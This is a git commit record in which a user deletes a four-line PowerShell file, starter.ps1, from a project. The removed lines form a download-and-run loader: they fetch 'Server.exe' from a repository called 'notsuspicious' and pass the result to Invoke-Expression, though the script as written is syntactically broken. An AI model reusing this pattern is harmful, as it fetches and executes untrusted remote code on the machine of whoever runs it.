74794b67f876a01fc5f7c4738ef8a10043d4bd20
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-17 12:19:55 +0100

    Delete starter.ps1

--- starter.ps1
+++
@@ -1,4 +0,0 @@
-$content = Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/Server.exe'
-$stringContent = [System.Text.Encoding] :: UTF-8.GetString($content.Content)
-
-Invoke-Expression -Command $stringcontent
